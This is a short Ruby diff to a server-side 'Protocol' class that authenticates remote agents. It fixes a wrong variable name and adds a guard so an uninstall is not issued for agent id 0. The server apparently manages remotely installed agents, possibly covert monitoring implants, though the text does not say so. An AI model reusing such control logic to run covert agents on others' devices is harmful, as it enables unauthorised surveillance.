@@ -170,7 +170,7 @@ class Protocol
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
-        DB.instance.agent_uninstall(aid)
+        DB.instance.agent_uninstall(aid) unless aid.eql? 0
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
@@ -302,7 +302,7 @@ class Protocol
     end
 
     # ask the database the status of the agent
-    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
+    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
 
     # if the agent was completely removed from the db we don't have the good flag anymore
     # and the rest call defaults to "bad", but if it's trying to sync on a good anon we
@@ -329,7 +329,7 @@ class Protocol
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
-        DB.instance.agent_uninstall(bid)
+        DB.instance.agent_uninstall(aid) unless aid.eql? 0
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
@@ -338,7 +338,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, level, k, peer)
+        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, level, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
